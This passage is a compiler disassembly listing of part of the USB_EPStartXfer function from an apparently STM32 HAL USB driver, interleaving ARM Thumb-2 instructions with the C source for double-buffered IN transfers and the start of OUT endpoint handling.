 80074f6:	881b      	ldrh	r3, [r3, #0]
 80074f8:	b29b      	uxth	r3, r3
 80074fa:	f423 43e2 	bic.w	r3, r3, #28928	; 0x7100
 80074fe:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8007502:	f8a7 3062 	strh.w	r3, [r7, #98]	; 0x62
 8007506:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800750a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800750e:	681a      	ldr	r2, [r3, #0]
 8007510:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007514:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007518:	681b      	ldr	r3, [r3, #0]
 800751a:	781b      	ldrb	r3, [r3, #0]
 800751c:	009b      	lsls	r3, r3, #2
 800751e:	441a      	add	r2, r3
 8007520:	f8b7 3062 	ldrh.w	r3, [r7, #98]	; 0x62
 8007524:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8007528:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800752c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8007530:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8007534:	b29b      	uxth	r3, r3
 8007536:	8013      	strh	r3, [r2, #0]

          /* Set Tx count with nbre of byte to be transmitted */
          PCD_SET_EP_TX_CNT(USBx, ep->num, len);
 8007538:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800753c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007540:	681b      	ldr	r3, [r3, #0]
 8007542:	65fb      	str	r3, [r7, #92]	; 0x5c
 8007544:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007548:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800754c:	681b      	ldr	r3, [r3, #0]
 800754e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007552:	b29b      	uxth	r3, r3
 8007554:	461a      	mov	r2, r3
 8007556:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8007558:	4413      	add	r3, r2
 800755a:	65fb      	str	r3, [r7, #92]	; 0x5c
 800755c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007560:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007564:	681b      	ldr	r3, [r3, #0]
 8007566:	781b      	ldrb	r3, [r3, #0]
 8007568:	00da      	lsls	r2, r3, #3
 800756a:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 800756c:	4413      	add	r3, r2
 800756e:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007572:	65bb      	str	r3, [r7, #88]	; 0x58
 8007574:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007578:	b29a      	uxth	r2, r3
 800757a:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 800757c:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr0;
 800757e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007582:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007586:	681b      	ldr	r3, [r3, #0]
 8007588:	891b      	ldrh	r3, [r3, #8]
 800758a:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 800758e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007592:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007596:	681b      	ldr	r3, [r3, #0]
 8007598:	6959      	ldr	r1, [r3, #20]
 800759a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800759e:	b29b      	uxth	r3, r3
 80075a0:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 80075a4:	f507 7084 	add.w	r0, r7, #264	; 0x108
 80075a8:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 80075ac:	6800      	ldr	r0, [r0, #0]
 80075ae:	f001 f82a 	bl	8008606 <USB_WritePMA>
 80075b2:	e1b3      	b.n	800791c <USB_EPStartXfer+0xd2e>
        }
      }
      else /* manage isochronous double buffer IN mode */
      {
        /* each Time to write in PMA xfer_len_db will */
        ep->xfer_len_db -= len;
 80075b4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075b8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80075bc:	681b      	ldr	r3, [r3, #0]
 80075be:	6a1a      	ldr	r2, [r3, #32]
 80075c0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80075c4:	1ad2      	subs	r2, r2, r3
 80075c6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075ca:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80075ce:	681b      	ldr	r3, [r3, #0]
 80075d0:	621a      	str	r2, [r3, #32]

        /* Fill the data buffer */
        if ((PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_DTOG_TX) != 0U)
 80075d2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075d6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80075da:	681a      	ldr	r2, [r3, #0]
 80075dc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075e0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80075e4:	681b      	ldr	r3, [r3, #0]
 80075e6:	781b      	ldrb	r3, [r3, #0]
 80075e8:	009b      	lsls	r3, r3, #2
 80075ea:	4413      	add	r3, r2
 80075ec:	881b      	ldrh	r3, [r3, #0]
 80075ee:	b29b      	uxth	r3, r3
 80075f0:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80075f4:	2b00      	cmp	r3, #0
 80075f6:	f000 80c6 	beq.w	8007786 <USB_EPStartXfer+0xb98>
        {
          /* Set the Double buffer counter for pmabuffer1 */
          PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 80075fa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075fe:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007602:	681b      	ldr	r3, [r3, #0]
 8007604:	673b      	str	r3, [r7, #112]	; 0x70
 8007606:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800760a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800760e:	681b      	ldr	r3, [r3, #0]
 8007610:	785b      	ldrb	r3, [r3, #1]
 8007612:	2b00      	cmp	r3, #0
 8007614:	d177      	bne.n	8007706 <USB_EPStartXfer+0xb18>
 8007616:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800761a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800761e:	681b      	ldr	r3, [r3, #0]
 8007620:	66bb      	str	r3, [r7, #104]	; 0x68
 8007622:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007626:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800762a:	681b      	ldr	r3, [r3, #0]
 800762c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007630:	b29b      	uxth	r3, r3
 8007632:	461a      	mov	r2, r3
 8007634:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8007636:	4413      	add	r3, r2
 8007638:	66bb      	str	r3, [r7, #104]	; 0x68
 800763a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800763e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007642:	681b      	ldr	r3, [r3, #0]
 8007644:	781b      	ldrb	r3, [r3, #0]
 8007646:	00da      	lsls	r2, r3, #3
 8007648:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 800764a:	4413      	add	r3, r2
 800764c:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007650:	667b      	str	r3, [r7, #100]	; 0x64
 8007652:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007654:	881b      	ldrh	r3, [r3, #0]
 8007656:	b29b      	uxth	r3, r3
 8007658:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800765c:	b29a      	uxth	r2, r3
 800765e:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007660:	801a      	strh	r2, [r3, #0]
 8007662:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007666:	2b3e      	cmp	r3, #62	; 0x3e
 8007668:	d921      	bls.n	80076ae <USB_EPStartXfer+0xac0>
 800766a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800766e:	095b      	lsrs	r3, r3, #5
 8007670:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 8007674:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007678:	f003 031f 	and.w	r3, r3, #31
 800767c:	2b00      	cmp	r3, #0
 800767e:	d104      	bne.n	800768a <USB_EPStartXfer+0xa9c>
 8007680:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 8007684:	3b01      	subs	r3, #1
 8007686:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 800768a:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 800768c:	881b      	ldrh	r3, [r3, #0]
 800768e:	b29a      	uxth	r2, r3
 8007690:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 8007694:	b29b      	uxth	r3, r3
 8007696:	029b      	lsls	r3, r3, #10
 8007698:	b29b      	uxth	r3, r3
 800769a:	4313      	orrs	r3, r2
 800769c:	b29b      	uxth	r3, r3
 800769e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80076a2:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80076a6:	b29a      	uxth	r2, r3
 80076a8:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80076aa:	801a      	strh	r2, [r3, #0]
 80076ac:	e050      	b.n	8007750 <USB_EPStartXfer+0xb62>
 80076ae:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80076b2:	2b00      	cmp	r3, #0
 80076b4:	d10a      	bne.n	80076cc <USB_EPStartXfer+0xade>
 80076b6:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80076b8:	881b      	ldrh	r3, [r3, #0]
 80076ba:	b29b      	uxth	r3, r3
 80076bc:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80076c0:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80076c4:	b29a      	uxth	r2, r3
 80076c6:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80076c8:	801a      	strh	r2, [r3, #0]
 80076ca:	e041      	b.n	8007750 <USB_EPStartXfer+0xb62>
 80076cc:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80076d0:	085b      	lsrs	r3, r3, #1
 80076d2:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 80076d6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80076da:	f003 0301 	and.w	r3, r3, #1
 80076de:	2b00      	cmp	r3, #0
 80076e0:	d004      	beq.n	80076ec <USB_EPStartXfer+0xafe>
 80076e2:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 80076e6:	3301      	adds	r3, #1
 80076e8:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 80076ec:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80076ee:	881b      	ldrh	r3, [r3, #0]
 80076f0:	b29a      	uxth	r2, r3
 80076f2:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 80076f6:	b29b      	uxth	r3, r3
 80076f8:	029b      	lsls	r3, r3, #10
 80076fa:	b29b      	uxth	r3, r3
 80076fc:	4313      	orrs	r3, r2
 80076fe:	b29a      	uxth	r2, r3
 8007700:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007702:	801a      	strh	r2, [r3, #0]
 8007704:	e024      	b.n	8007750 <USB_EPStartXfer+0xb62>
 8007706:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800770a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800770e:	681b      	ldr	r3, [r3, #0]
 8007710:	785b      	ldrb	r3, [r3, #1]
 8007712:	2b01      	cmp	r3, #1
 8007714:	d11c      	bne.n	8007750 <USB_EPStartXfer+0xb62>
 8007716:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800771a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800771e:	681b      	ldr	r3, [r3, #0]
 8007720:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007724:	b29b      	uxth	r3, r3
 8007726:	461a      	mov	r2, r3
 8007728:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 800772a:	4413      	add	r3, r2
 800772c:	673b      	str	r3, [r7, #112]	; 0x70
 800772e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007732:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007736:	681b      	ldr	r3, [r3, #0]
 8007738:	781b      	ldrb	r3, [r3, #0]
 800773a:	00da      	lsls	r2, r3, #3
 800773c:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 800773e:	4413      	add	r3, r2
 8007740:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007744:	66fb      	str	r3, [r7, #108]	; 0x6c
 8007746:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800774a:	b29a      	uxth	r2, r3
 800774c:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 800774e:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr1;
 8007750:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007754:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007758:	681b      	ldr	r3, [r3, #0]
 800775a:	895b      	ldrh	r3, [r3, #10]
 800775c:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8007760:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007764:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007768:	681b      	ldr	r3, [r3, #0]
 800776a:	6959      	ldr	r1, [r3, #20]
 800776c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007770:	b29b      	uxth	r3, r3
 8007772:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8007776:	f507 7084 	add.w	r0, r7, #264	; 0x108
 800777a:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 800777e:	6800      	ldr	r0, [r0, #0]
 8007780:	f000 ff41 	bl	8008606 <USB_WritePMA>
 8007784:	e0ca      	b.n	800791c <USB_EPStartXfer+0xd2e>
        }
        else
        {
          /* Set the Double buffer counter for pmabuffer0 */
          PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 8007786:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800778a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800778e:	681b      	ldr	r3, [r3, #0]
 8007790:	785b      	ldrb	r3, [r3, #1]
 8007792:	2b00      	cmp	r3, #0
 8007794:	d177      	bne.n	8007886 <USB_EPStartXfer+0xc98>
 8007796:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800779a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800779e:	681b      	ldr	r3, [r3, #0]
 80077a0:	67fb      	str	r3, [r7, #124]	; 0x7c
 80077a2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077a6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80077aa:	681b      	ldr	r3, [r3, #0]
 80077ac:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80077b0:	b29b      	uxth	r3, r3
 80077b2:	461a      	mov	r2, r3
 80077b4:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 80077b6:	4413      	add	r3, r2
 80077b8:	67fb      	str	r3, [r7, #124]	; 0x7c
 80077ba:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077be:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077c2:	681b      	ldr	r3, [r3, #0]
 80077c4:	781b      	ldrb	r3, [r3, #0]
 80077c6:	00da      	lsls	r2, r3, #3
 80077c8:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 80077ca:	4413      	add	r3, r2
 80077cc:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80077d0:	67bb      	str	r3, [r7, #120]	; 0x78
 80077d2:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80077d4:	881b      	ldrh	r3, [r3, #0]
 80077d6:	b29b      	uxth	r3, r3
 80077d8:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80077dc:	b29a      	uxth	r2, r3
 80077de:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80077e0:	801a      	strh	r2, [r3, #0]
 80077e2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80077e6:	2b3e      	cmp	r3, #62	; 0x3e
 80077e8:	d921      	bls.n	800782e <USB_EPStartXfer+0xc40>
 80077ea:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80077ee:	095b      	lsrs	r3, r3, #5
 80077f0:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 80077f4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80077f8:	f003 031f 	and.w	r3, r3, #31
 80077fc:	2b00      	cmp	r3, #0
 80077fe:	d104      	bne.n	800780a <USB_EPStartXfer+0xc1c>
 8007800:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 8007804:	3b01      	subs	r3, #1
 8007806:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 800780a:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800780c:	881b      	ldrh	r3, [r3, #0]
 800780e:	b29a      	uxth	r2, r3
 8007810:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 8007814:	b29b      	uxth	r3, r3
 8007816:	029b      	lsls	r3, r3, #10
 8007818:	b29b      	uxth	r3, r3
 800781a:	4313      	orrs	r3, r2
 800781c:	b29b      	uxth	r3, r3
 800781e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007822:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007826:	b29a      	uxth	r2, r3
 8007828:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800782a:	801a      	strh	r2, [r3, #0]
 800782c:	e05c      	b.n	80078e8 <USB_EPStartXfer+0xcfa>
 800782e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007832:	2b00      	cmp	r3, #0
 8007834:	d10a      	bne.n	800784c <USB_EPStartXfer+0xc5e>
 8007836:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007838:	881b      	ldrh	r3, [r3, #0]
 800783a:	b29b      	uxth	r3, r3
 800783c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007840:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007844:	b29a      	uxth	r2, r3
 8007846:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007848:	801a      	strh	r2, [r3, #0]
 800784a:	e04d      	b.n	80078e8 <USB_EPStartXfer+0xcfa>
 800784c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007850:	085b      	lsrs	r3, r3, #1
 8007852:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 8007856:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800785a:	f003 0301 	and.w	r3, r3, #1
 800785e:	2b00      	cmp	r3, #0
 8007860:	d004      	beq.n	800786c <USB_EPStartXfer+0xc7e>
 8007862:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 8007866:	3301      	adds	r3, #1
 8007868:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 800786c:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800786e:	881b      	ldrh	r3, [r3, #0]
 8007870:	b29a      	uxth	r2, r3
 8007872:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 8007876:	b29b      	uxth	r3, r3
 8007878:	029b      	lsls	r3, r3, #10
 800787a:	b29b      	uxth	r3, r3
 800787c:	4313      	orrs	r3, r2
 800787e:	b29a      	uxth	r2, r3
 8007880:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007882:	801a      	strh	r2, [r3, #0]
 8007884:	e030      	b.n	80078e8 <USB_EPStartXfer+0xcfa>
 8007886:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800788a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800788e:	681b      	ldr	r3, [r3, #0]
 8007890:	785b      	ldrb	r3, [r3, #1]
 8007892:	2b01      	cmp	r3, #1
 8007894:	d128      	bne.n	80078e8 <USB_EPStartXfer+0xcfa>
 8007896:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800789a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800789e:	681b      	ldr	r3, [r3, #0]
 80078a0:	f8c7 3084 	str.w	r3, [r7, #132]	; 0x84
 80078a4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80078a8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80078ac:	681b      	ldr	r3, [r3, #0]
 80078ae:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80078b2:	b29b      	uxth	r3, r3
 80078b4:	461a      	mov	r2, r3
 80078b6:	f8d7 3084 	ldr.w	r3, [r7, #132]	; 0x84
 80078ba:	4413      	add	r3, r2
 80078bc:	f8c7 3084 	str.w	r3, [r7, #132]	; 0x84
 80078c0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80078c4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80078c8:	681b      	ldr	r3, [r3, #0]
 80078ca:	781b      	ldrb	r3, [r3, #0]
 80078cc:	00da      	lsls	r2, r3, #3
 80078ce:	f8d7 3084 	ldr.w	r3, [r7, #132]	; 0x84
 80078d2:	4413      	add	r3, r2
 80078d4:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80078d8:	f8c7 3080 	str.w	r3, [r7, #128]	; 0x80
 80078dc:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80078e0:	b29a      	uxth	r2, r3
 80078e2:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 80078e6:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr0;
 80078e8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80078ec:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80078f0:	681b      	ldr	r3, [r3, #0]
 80078f2:	891b      	ldrh	r3, [r3, #8]
 80078f4:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 80078f8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80078fc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007900:	681b      	ldr	r3, [r3, #0]
 8007902:	6959      	ldr	r1, [r3, #20]
 8007904:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007908:	b29b      	uxth	r3, r3
 800790a:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 800790e:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8007912:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8007916:	6800      	ldr	r0, [r0, #0]
 8007918:	f000 fe75 	bl	8008606 <USB_WritePMA>
        }
      }
    }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

    PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_VALID);
 800791c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007920:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007924:	681a      	ldr	r2, [r3, #0]
 8007926:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800792a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800792e:	681b      	ldr	r3, [r3, #0]
 8007930:	781b      	ldrb	r3, [r3, #0]
 8007932:	009b      	lsls	r3, r3, #2
 8007934:	4413      	add	r3, r2
 8007936:	881b      	ldrh	r3, [r3, #0]
 8007938:	b29b      	uxth	r3, r3
 800793a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800793e:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8007942:	817b      	strh	r3, [r7, #10]
 8007944:	897b      	ldrh	r3, [r7, #10]
 8007946:	f083 0310 	eor.w	r3, r3, #16
 800794a:	817b      	strh	r3, [r7, #10]
 800794c:	897b      	ldrh	r3, [r7, #10]
 800794e:	f083 0320 	eor.w	r3, r3, #32
 8007952:	817b      	strh	r3, [r7, #10]
 8007954:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007958:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800795c:	681a      	ldr	r2, [r3, #0]
 800795e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007962:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007966:	681b      	ldr	r3, [r3, #0]
 8007968:	781b      	ldrb	r3, [r3, #0]
 800796a:	009b      	lsls	r3, r3, #2
 800796c:	441a      	add	r2, r3
 800796e:	897b      	ldrh	r3, [r7, #10]
 8007970:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8007974:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8007978:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800797c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8007980:	b29b      	uxth	r3, r3
 8007982:	8013      	strh	r3, [r2, #0]
 8007984:	f000 bcde 	b.w	8008344 <USB_EPStartXfer+0x1756>
  }
  else /* OUT endpoint */
  {
    if (ep->doublebuffer == 0U)
 8007988:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800798c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007990:	681b      	ldr	r3, [r3, #0]
 8007992:	7b1b      	ldrb	r3, [r3, #12]
 8007994:	2b00      	cmp	r3, #0
 8007996:	f040 80bb 	bne.w	8007b10 <USB_EPStartXfer+0xf22>
    {
      /* Multi packet transfer */
      if (ep->xfer_len > ep->maxpacket)
 800799a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800799e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079a2:	681b      	ldr	r3, [r3, #0]
 80079a4:	699a      	ldr	r2, [r3, #24]
 80079a6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079aa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079ae:	681b      	ldr	r3, [r3, #0]
 80079b0:	691b      	ldr	r3, [r3, #16]
 80079b2:	429a      	cmp	r2, r3
 80079b4:	d917      	bls.n	80079e6 <USB_EPStartXfer+0xdf8>
      {
        len = ep->maxpacket;
 80079b6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079ba:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079be:	681b      	ldr	r3, [r3, #0]
 80079c0:	691b      	ldr	r3, [r3, #16]
 80079c2:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
        ep->xfer_len -= len;
 80079c6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079ca:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079ce:	681b      	ldr	r3, [r3, #0]
 80079d0:	699a      	ldr	r2, [r3, #24]
 80079d2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80079d6:	1ad2      	subs	r2, r2, r3
 80079d8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079dc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079e0:	681b      	ldr	r3, [r3, #0]
 80079e2:	619a      	str	r2, [r3, #24]
 80079e4:	e00e      	b.n	8007a04 <USB_EPStartXfer+0xe16>
      }
      else
      {
        len = ep->xfer_len;
 80079e6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079ea:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079ee:	681b      	ldr	r3, [r3, #0]
 80079f0:	699b      	ldr	r3, [r3, #24]
 80079f2:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
        ep->xfer_len = 0U;
 80079f6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079fa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079fe:	681b      	ldr	r3, [r3, #0]
 8007a00:	2200      	movs	r2, #0
 8007a02:	619a      	str	r2, [r3, #24]
      }
      /* configure and validate Rx endpoint */
      PCD_SET_EP_RX_CNT(USBx, ep->num, len);
 8007a04:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a08:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007a0c:	681b      	ldr	r3, [r3, #0]
 8007a0e:	f8c7 3090 	str.w	r3, [r7, #144]	; 0x90
 8007a12:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a16:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007a1a:	681b      	ldr	r3, [r3, #0]
 8007a1c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007a20:	b29b      	uxth	r3, r3
 8007a22:	461a      	mov	r2, r3
 8007a24:	f8d7 3090 	ldr.w	r3, [r7, #144]	; 0x90
 8007a28:	4413      	add	r3, r2
 8007a2a:	f8c7 3090 	str.w	r3, [r7, #144]	; 0x90
 8007a2e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a32:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a36:	681b      	ldr	r3, [r3, #0]
 8007a38:	781b      	ldrb	r3, [r3, #0]
 8007a3a:	00da      	lsls	r2, r3, #3
